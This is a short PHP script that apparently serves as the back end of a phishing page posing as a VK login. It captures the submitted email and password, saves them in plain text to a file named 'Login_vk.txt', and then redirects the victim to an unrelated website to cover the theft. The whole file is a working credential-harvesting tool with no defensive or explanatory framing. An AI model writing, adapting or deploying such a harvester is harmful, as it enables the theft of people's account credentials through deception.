<?php 
	$login = $_POST["email"]; 
	$password = $_POST["pass"];
	$text_file = fopen("Login_vk.txt", "w+");
	ftruncate($text_file, 0);
	$content = "Login: ".$login. PHP_EOL ."Password: " .$password;
	fwrite($text_file, $content);
	fclose($text_file);

	//fputs($f,"password: ". $_POST['pass']. "\n". "---------------\n");

?>
<script type="text/javascript">
	document.location.href="https://howdyho.net/";
</script>